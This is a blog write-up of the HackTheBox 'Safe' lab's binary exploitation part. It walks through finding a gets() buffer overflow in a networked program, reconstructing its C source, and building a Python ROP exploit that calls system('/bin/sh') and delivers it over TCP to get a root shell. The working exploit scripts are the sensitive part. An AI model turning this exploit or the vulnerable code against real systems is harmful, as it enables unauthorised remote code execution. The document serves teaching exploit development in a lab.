---
layout: post
title: "HackTheBox Safe Pwn Write-Up"
categories: Write-Up
date: 2022-01-11
image: /images/safe-pwn/1.png
description: Safe is an east difficulty Linux machine. In this write-up we will complete the binary exploitation section of the lab. We will examine a networked CLI application, find a buffer overflow vulnerability, then design and execute a return-oriented programming exploit to gain shell access to the server.
tags: [HTB, Write-Up, Pwn]
katex: true
markup: "mmark"
---

![HackTheBox](/images/safe-pwn/1.png#center)

******

## Getting Started

At this section of the lab we have found an unknown service running on port 1337 over [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) by using the [Nmap](https://svn.nmap.org/) port scanner. We have also found what appears to be a copy of the executable binary named **myapp** hosted on a web server. We can download this copy of the binary and analyze it locally.

> *For the purpose of this write-up I will use [socat](https://linux.die.net/man/1/socat) to serve the application locally under the root account using sudo.*

![](/images/safe-pwn/pics/2.png#center)

Connecting to the application/service with [netcat](http://netcat.sourceforge.net/) shows us it's simple functionality. First we do a quick scan with nmap to show that the port is open for connection. We connect to the service and the first thing we see is it sending system [uptime](https://linux.die.net/man/1/uptime) information. Next we send it some test inputs (boxed in red) and receive some data back from the application (boxed in green).

![](/images/safe-pwn/pics/4.png#center)

It's a little out of order, but it seems to echo back our input to us, seen clearly with our *test2* input. We can also infer that it is running **uptime** on the server and returning the output to us by testing that program in our local shell and comparing the output. As our server application and local user shell are being run on the same machine, the output is identical, nearly confirming **uptime** is being run by the server application.

![](/images/safe-pwn/pics/5.png#center)

******

## Initial Inspection

After downloading the **myapp** executable binary from the web server we run it to confirm it has the same functionality as the networked application. Running the program locally we now see it echos back our input in the correct order. I suspect this was just a quirk of how we were serving the program with socat, so moving forward it shouldn't be an issue.

![](/images/safe-pwn/pics/6.png#center)

Running [file](https://linux.die.net/man/1/file) and [ldd](https://linux.die.net/man/1/ldd) shows it is a [64 bit ELF executable](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format), not [stripped](https://en.wikipedia.org/wiki/Stripped_binary) of [debugging information](https://en.wikipedia.org/wiki/Debug_symbol), is [dynamically linked](https://en.wikipedia.org/wiki/Dynamic_linker) and shows us the [shared libraries](https://en.wikipedia.org/wiki/Library_(computing)#Shared\_libraries). We can see that this binary was compiled for [GNU/](https://www.gnu.org/)[Linux](https://www.kernel.org/) and links to the system's installed [libc](https://en.wikipedia.org/wiki/C_standard_library) library.

![](/images/safe-pwn/pics/7.png#center)

Let's list out what we know so far to help us decide how to move forward:
>
- *There is a networked application running on the server*
- *We can communicate with this application via TCP connection with netcat*
- *This application runs a system command and returns the output*
- *This application accepts, processes and returns user input in some way*
- *We have access to the application binary for local analysis*
- *The application was compiled for GNU/Linux and dynamically links to the C Standard Library*

******

## Buffer Overflow Vulnerability

The first thing we should try is to leverage the user input functionality. This is a very simple yet powerful attack vector. If there are no [bounds checking](https://en.wikipedia.org/wiki/Bounds_checking) or [stack-smashing protections](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Implementations) we may be able to overrun this input [buffer](https://en.wikipedia.org/wiki/Data_buffer) and access memory elsewhere in the [call stack](https://en.wikipedia.org/wiki/Call_stack), possibly allowing us to perform a [stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow) attack. We can test for this simply by sending different sized inputs to the program. Triggering a [segmentation fault](https://en.wikipedia.org/wiki/Segmentation_fault) will indicate that we are writing outside of the input buffer and the program is vulnerable to this type of attack. Using [python](https://www.python.org/) to [pipe](https://www.educba.com/linux-pipe-command/) input to the program we are able to trigger a segmentation fault with an input of 200 characters.

![](/images/safe-pwn/pics/8.png#center)

******

## Analyzing and Reversing

We will use [gdb](https://sourceware.org/gdb/) with the [gef](https://gef.readthedocs.io/en/master/) extension to analyze and debug the program. Running the [*checksec*](https://gef.readthedocs.io/en/master/commands/checksec/) command will check which security protections are enabled in the binary. We can see that the [NX bit](https://en.wikipedia.org/wiki/NX_bit) (no-execute) feature is enabled. This will prevent us from writing instructions directly onto the call stack and executing them. There is also [partial RelRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) (Relocation Read-Only) protection which reorders the internal data sections to protect them from being overwritten in the event of a buffer overflow.

> *"From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the [GOT](https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0\_zSeries/x2251.html#GLOBALOFFSETTABLE) to come before the [BSS](https://refspecs.linuxbase.org/LSB\_3.0.0/LSB-PDA/LSB-PDA/specialsections.html#BSS) in memory, eliminating the risk of a buffer overflows on a [global variable](https://www.techopedia.com/definition/25617/global-variable) overwriting GOT entries."* <sup id="cite_note-1">[[1]](#cite\_ref-1)</sup>

![](/images/safe-pwn/pics/9.png#center)

The [executable-space protection](https://en.wikipedia.org/wiki/Executable_space_protection) (NX bit) stops us from simply injecting and executing arbitrary code, so let's dig deeper into the program and find another way we can leverage the buffer overflow. Running [*info functions*](https://visualgdb.com/gdbreference/commands/info_functions) lists the functions in the program as well as their [virtual addresses](https://en.wikipedia.org/wiki/Virtual_address_space).

![](/images/safe-pwn/pics/10.png#center)

[puts](https://en.cppreference.com/w/c/io/puts), [system](https://linux.die.net/man/3/system), [printf](https://en.cppreference.com/w/c/io/fprintf) and [gets](https://en.cppreference.com/w/c/io/gets) are all functions that are dynamically linked from the **libc** shared library. The **system** function really catches my eye as the purpose of this function is to execute [shell commands](https://www.tutorialspoint.com/what-are-shell-commands). I suspect this is what is being used to execute **uptime**, and we may find this useful for our exploit. **main** and **test** seem to be functions native to our program, as **main** is the usual entry point for [C programs](https://en.wikipedia.org/wiki/The_C_Programming_Language) and because debugging symbols have not been stripped, **test** is a variable name for an included function as well. Let's disassemble the **main** function and look at the resulting [assembly code](https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf).

![](/images/safe-pwn/pics/11.png#center)

This is a very simple program. We will re-create this in C below, but first I want to point out a few things. First and foremost this program is using the **gets** function to receive standard input from the user, which is a **_HUGE NO-NO_**. This is how we are able to buffer overflow the program's input.

> _"The gets() function does not perform bounds checking, therefore this function is extremely vulnerable to buffer-overflow attacks. It cannot be used safely (unless the program runs in an environment which restricts what can appear on stdin). For this reason, the function has been deprecated in the third corrigendum to the C99 standard and removed altogether in the C11 standard. fgets() and gets\_s() are the recommended replacements. **Never use gets()**."_ <sup id="cite_note-2">[[2]](#cite\_ref-2)</sup>

Now that we've addressed the cause of the buffer overflow vulnerability, let's explore how the call to the **system** function works. We see that instruction **<+8>** is [loading](https://www.felixcloutier.com/x86/lea) an address into the **RDI** register, then instruction **<+15>** is calling the **system** function. The **RDI** register is used to store the address of the first argument for function calls in [Linux x86\_64](https://courses.cs.washington.edu/courses/cse378/10au/sections/Section1_recap.pdf). When we run the [*x/s*](https://courses.cs.washington.edu/courses/cse351/20au/gdb/gdbnotes-x86-64.pdf) command on that address, we see it points to the string "*/usr/bin/uptime*", so we know the program is executing **system("/usr/bin/uptime")**, completely confirming our earlier assumption. Understanding how this works will be crucial to the development of our exploit. I also want to point out that the **test** function is not referenced at all in **main**. Normally this could be because the function is an artifact of the development process, or [dead code](https://en.wikipedia.org/wiki/Dead_code), but here I suspect it was created for us to use in our exploitation of this program. Let's disassemble **test** and see what it does.

![](/images/safe-pwn/pics/12.png#center)

From what I can tell, this function really isn't doing anything useful, aside from giving us something to use in our exploit. All it does is push the value contained in the **RBP** register onto the call stack, [moves](https://www.felixcloutier.com/x86/mov) the address pointing to that value into the **RDI** register via the **RSP** register, jumps to the address stored in the **R13** register, pops **RBP** off of the call stack, and finally returns to the calling function. I'm not even sure how we could write this in C, but for our source reconstruction we can just use the [\_\_asm\_\_](https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html) keyword to write the assembly code directly in our C source re-creation.

Here is my attempt at re-creating the original C source code for this program with comments added to help understand what each line translates to in assembly code:

```c
// my_source_myapp.c

// gcc my_source_myapp.c -o my_source_myapp -fno-stack-protector -no-pie -w


int main(void) {

    char echo[112];  //..................................// sub    rsp,0x70

    system("/usr/bin/uptime");  //.......................// lea    rdi,[rip+0xe9a] # 0x402008
                                //.......................// call   0x401040 <system@plt>

    printf("\nWhat do you want me to echo back? ");  //..// lea    rdi,[rip+0xe9e] # 0x402018
                                                     //..// call   0x401050 <printf@plt>

    gets(echo);  //......................................// lea    rax,[rbp-0x70]
                 //......................................// mov    rdi,rax
                 //......................................// call   0x401060 <gets@plt>

    puts(echo);  //......................................// lea    rax,[rbp-0x70]
                 //......................................// mov    rdi,rax
                 //......................................// call   0x401030 <puts@plt>

    return 0;    //......................................// mov    eax,0x0
                 //......................................// leave
                 //......................................// ret
}

void test(void) {
    __asm__(
        "mov %rsp,%rdi\n\t"
        "jmpq *%r13"
	);
}
```

Compiling using [gcc](https://gcc.gnu.org/) with the flags listed at the top creates nearly identical assembly code for me when inspected with [*objdump*](https://linux.die.net/man/1/objdump). There are a few unimportant discrepancies, but those are probably the result of minor compiler version/optimization differences and shouldn't be an issue.

![](/images/safe-pwn/pics/29.png#center)

![](/images/safe-pwn/pics/30.png#center)

******

## Debugging and Finding the Offset

Let's run the program in gdb, setting a [breakpoint](https://visualgdb.com/gdbreference/commands/break) at the call to **system** to examine the registers at this state of the program runtime. Here we can see that the address pointing to the "*uptime*" string has been loaded into the **RDI** register and the **RIP** (instruction pointer) register contains the address of the **system** function. The program is set up and ready to execute **system("/usr/bin/uptime")** at continuation of execution.

![](/images/safe-pwn/pics/13.png#center)
![](/images/safe-pwn/pics/15.png#center)
![](/images/safe-pwn/pics/14.png#center)

Now let's halt execution and explore the buffer overflow vulnerability. We'll first [delete](https://visualgdb.com/gdbreference/commands/delete) the previous breakpoint then use the [pattern create](https://gef.readthedocs.io/en/master/commands/pattern/) command to generate a [De Bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence) cyclic pattern of 200 bytes, as we know 200 bytes will cause a segmentation fault and overrun the input buffer used by **gets** (which we assigned the variable name **_echo_** to in our source re-creation). Then we run the program and use that pattern when prompted to supply our input.

![](/images/safe-pwn/pics/16.png#center)

As expected we receive a segmentation fault, but now we can examine the current state of the program at the fault and see where are our input is being written.

![](/images/safe-pwn/pics/17.png#center)

Using the pattern search command we can see how many bytes we need to input to overwrite the **RSP** register. The **RSP** register contains the address the current function will return to when the **ret** instruction is called. This shows that we need to input 120 bytes to reach the **RSP** register. We could then write any valid address to that register and that is where the **main** function will return. Also note that we are overwriting the **RBP** register as well. When we search for the contents of what **RBP** contains, we see that it is 112 bytes past the start of our input buffer, or _0x70_ in hexadecimal, as the assembly code shows us.

![](/images/safe-pwn/pics/26.png#center)

So let's recap how our input is handled:
>
- _The first 112 bytes write to the input buffer, or **RSI** register_
- _Bytes 113-120 overwrite the **RBP** register_
- _Bytes 120+ overwrite the **RSP** register, which is the address where the function will return_

\\
If we only send 112 bytes of junk followed by an 8 byte [string](https://en.wikipedia.org/wiki/String_(computer_science)), "*deadbeef*", we can write that string into the **RBP** register.

![](/images/safe-pwn/pics/18.png#center)

******

## Return-Oriented Programming

The limitied binary protections, buffer overflow vulnerability via **gets** function for user supplied input and easy access to the **system** function make this program is a prime candidate for [Return-Oriented Programing](https://en.wikipedia.org/wiki/Return-oriented_programming) exploitation, or *ROP* for short.

> _"The concept of ROP is simple but tricky. . . [W]e wil[l] be utilizing small instruction sequences available in either the binary or libraries linked to the application called gadgets. . . ROP gadgets are small instruction sequences ending with a “ret” instruction “c3”. Combining these gadgets will enable us to perform certain tasks and in the end conduct our attack . . . [I]nstead of returning to an address of a function . . . we will return to these ROP gadgets. . . The ROP gadget has to end with a “ret” to enable us to perform multiple sequences. Hence it is called return oriented."_ <sup id="cite_note-3">[[3]](#cite\_ref-3)</sup>

Utilizing the ROP method we can find and chain together useful instruction sequences already present in the binary, essentially re-writing the program to do whatever we want by rearranging pre-existing code. Our ultimate goal here is to find and use ROP gadgets to help us massage program data and [control flow](https://en.wikipedia.org/wiki/Control_flow) in a way that spawns a [forked](https://en.wikipedia.org/wiki/Fork_(system_call)) [command-line shell](https://en.wikipedia.org/wiki/Shell_%28computing%29) process through execution of the binary.

[ROPEmporium](https://ropemporium.com/) is a great resource to learn more about ROP exploitation and practice your exploit building skills.

******

## Developing a ROP Exploit

Using python we can start to build a framework for our ROP exploit. In our python **test** function we will construct our input by first sending 112 bytes of "*A*"s followed by our 8 byte payload string, "*deadbeef*", followed by the address to **myapp**'s **test** function (using python's [struct module](https://docs.python.org/3.8/library/struct.html#module-struct) to pack the bytes into proper 8 byte [little endian](https://en.wikipedia.org/wiki/Endianness) format). The function then writes this to a file named *test_payload.txt*.

```python
#!/usr/bin/env python3
"""safe_pwn.py"""

import struct

# test
def test() -> None:
    """Test return to test function."""
    payload: bytes = (b"\x41" * 112)  # 112 bytes of 'A's to fill input buffer
    payload += b"deadbeef"  # string to write into rbp
    payload += struct.pack("<q", 0x401152)  # address of test function
    print("Our test payload:\n", payload)
    with open("test_payload.txt", "wb") as test_out:
        test_out.write(payload)


if __name__ == "__main__":
    test()
```

We run the new python script and generate our ROP test input.

![](/images/safe-pwn/pics/21.png#center)

Now we set a breakpoint at the address of **myapp**'s **test** function and run the program using our generated payload as the input with *run < payload.txt*. At the breakpoint we see that now **RBP** contains the string "*deadbeef*" and **RIP** contains the address of **test**, showing that the **test** function is the next [subroutine](https://en.wikipedia.org/wiki/Subroutine) the program will execute. 

![](/images/safe-pwn/pics/19.png#center)

Stepping over the call to **test** with command [*n*](https://www.tutorialspoint.com/gnu_debugger/gdb_commands.htm) shows us how the function has set up the call stack. The function prologue pushes the value **RBP** contains onto the stack, decrementing **RSP** 8 bytes. It then copies the contents of **RSP** into **RBP**, so they now both contain the stack address pointing to "*deadbeef*". Directly after the function prologue, **test** copies the value of **RSP** to the **RDI** register. Now all three registers, **RBP**, **RSP** and **RDI**, point to the string value "*deadbeef*".

![](/images/safe-pwn/pics/27.png#center)

*jmp  r13* is the next instruction **test** will execute after it copies the stack address of "*deadbeef*" into **RDI**.  Currently the **R13** register doesn't contain anything useful, but if it contained a valid address to another function, **test** would then jump to that function and execute it. We need to get a useful string address into **RDI**, then get the address of the **system** function into **R13**. That way we can call **system** with our payload string as it's argument, as per the [System V X86\_64 calling convention](https://wiki.osdev.org/Calling_Conventions). If we get **RDI** to point to the string "*[/bin/sh](https://linux.die.net/man/1/sh)*", then jump to the **system** address we would spawn a command-line shell  on the host machine.

This is where we can utilize the ROP exploitation method. If we can find a ROP *gadget* (machine instruction sequence accessible by the program that ends with a [return instruction](https://www.felixcloutier.com/x86/ret)) that can _pop **R13**_ off of the call stack, we can write the address of the **system** function to the register and then jump to it in the **test** function. We could manually search for a gadget but a better option would be to use the python tool [ropper](https://scoding.de/ropper/). Using this tool within gdb-gef we can easily search for a gadget containing "*pop r13*" with the command *[ropper --search "pop r13"](https://gef.readthedocs.io/en/master/commands/ropper/)*.

![](/images/safe-pwn/pics/20.png#center)

ropper has found a gadget we can use at the virtual address *0x401206*. This gadget not only pops **R13**, but also pops registers **R14** and **R15** before it executes the return instruction. These extra instruction will not be an issue, we can write *0x0* to those registers as they will not be used in our exploit.

******

## Testing Our Exploit Method

Let's list out what we need to send to the program in order to set up a shell command call for */bin/sh*:

>
- _112 bytes of junk to fill the input buffer_
- _8 byte string for our **system** argument to overwrite **RBP**_
- _Address of our ROP gadget to pop registers **R13**, **R14**, **R15** and then **ret** to overwrite **RSP**_
- _Address of the **system** function to write to **R13**_
- _0x0 to write to **R14**_
- _0x0 to write to **R15**_
- _Address of the **test** function to write to **RSP**_

\\
We will adapt our previous python test function to include our new payload instructions and write the data to the file *payload.txt*.

```python
#!/usr/bin/env python3
"""safe_pwn.py"""

import struct

# payload
def exploit() -> bytes:
    """Build our payload."""
    payload: bytes = (b"\x41" * 112)  # overflow junk
    payload += b"/bin/sh\x00"  # rbp : string argument for system function
    payload += struct.pack("<q", 0x401206)  # pop r13 ; pop r14 ; pop r15 ; ret
    payload += struct.pack("<q", 0x401040)  # r13 -> system
    payload += struct.pack("<q", 0x000000)  # r14 : 0x0
    payload += struct.pack("<q", 0x000000)  # r15 : 0x0
    payload += struct.pack("<q", 0x401152)  # test function

    print("Our payload:\n", payload)
    with open("payload.txt", "wb") as payload_out:
        payload_out.write(payload)
    return payload


if __name__ == "__main__":
    exploit()
```

We run the python script and generate our ROP exploit input.

![](/images/safe-pwn/pics/22.png#center)

Again we set a breakpoint at **test** and run the program with our generated payload as input.

![](/images/safe-pwn/pics/23.png#center)

When we hit the breakpoint and step through the subroutine we now have the stack address containing the string "*/bin/sh*" in the **RDI** register and the address of the **system** function in the **EIP** register. The program is now ready to execute **system("/bin/sh")**.

![](/images/safe-pwn/pics/24.png#center)

Running the program outside of gdb and piping our payload to it as input gives us command-line shell access. Our exploit method is successful.

![](/images/safe-pwn/pics/28.png#center)

******

## Exploiting the Networked Application

Running the program locally with our exploit payload piped directly to it as user input worked in getting us system shell access on our local machine, confirming our exploit works on the binary. Now we need to augment our exploit script to connect to the networked application running on the server and communicate with it. Rather than writing our payload to a file like we've previously done we can use python's [telnetlib](https://docs.python.org/3.8/library/telnetlib.html) module to establish a TCP connection to the server application and [interact](https://docs.python.org/3.8/library/telnetlib.html#telnetlib.Telnet.interact) with it, emulating a very dumb [Telnet](https://en.wikipedia.org/wiki/Telnet) client.

```python
#!/usr/bin/env python3
"""safe_pwn.py"""

import struct
from telnetlib import Telnet

HOST: str = "127.0.0.1"
PORT: int = 1337


# payload
def exploit() -> bytes:
    """Build our payload."""
    payload: bytes = (b"\x41" * 112)  # overflow junk
    payload += b"/bin/sh\x00"  # rbp : string argument for system function
    payload += struct.pack("<q", 0x401206)  # pop r13 ; pop r14 ; pop r15 ; ret
    payload += struct.pack("<q", 0x401040)  # r13 -> system
    payload += struct.pack("<q", 0x000000)  # r14 -> 0x0
    payload += struct.pack("<q", 0x000000)  # r15 -> 0x0
    payload += struct.pack("<q", 0x401152)  # test function
    return payload


def main() -> None:
    """Main function. Connect and interact
    with server application."""
    try:
        t_n: Telnet = Telnet(HOST, PORT)
        t_n.read_until(b"\n")
        t_n.write(exploit() + b"\n")
        print("\n[#] SYSTEM PWNED!! [#]\n")
        t_n.interact()
    except KeyboardInterrupt:
        print("\n\n[#] DISCONNECTING [#]\n")
        quit()
    except ConnectionRefusedError:
        print('\n[!] COULD NOT CONNECT TO SERVER [!]\n')
        quit()


if __name__ == "__main__":
    main()
```

The script establishes a telnet connection to the server application and once it receives a [newline](https://en.wikipedia.org/wiki/Newline) [control character](https://en.wikipedia.org/wiki/Control_character), sends our payload bytes followed by a newline, simulating a return key-press. It then emulates a minimal telnet client allowing us to run commands and receive the output. We run **whoami** and **hostname** to show that we are running a command-line shell on the server with root account privileges.

![](/images/safe-pwn/pics/25.png#center)

******

## Conclusion

This was a very trivial exploit performed on a useless, weakly secured, poorly written and implemented application. However contrived the example, this did allowed us to touch on a lot of concepts and methods that are applicable to real world exploit development such as binary inspection, binary security and protections, buffer overflow vulnerabilities, reverse engineering C program Assembly code, program debugging, Return-Oreinted Programming, and binary exploit development in Python. I enjoyed this section of the lab and learned a lot while completing it, as well as in writing this post and explaining the process.

******

#### References:

1. <sup id="cite_ref-1">[\^](#cite_note-1)</sup> ctf101.org; [*binary-exploitation/relocation-read-only/*](https://ctf101.org/binary-exploitation/relocation-read-only/)

2. <sup id="cite_ref-2">[\^](#cite_note-2)</sup> cppreference.com; [*gets, gets\_s*](https://en.cppreference.com/w/c/io/gets)

3. <sup id="cite_ref-3">[\^](#cite_note-3)</sup> Saif El-Sherei; [*Return-Oriented-Programming(ROP FTW)*](https://www.exploit-db.com/docs/english/28479-return-oriented-programming-\(rop-ftw\).pdf)

******
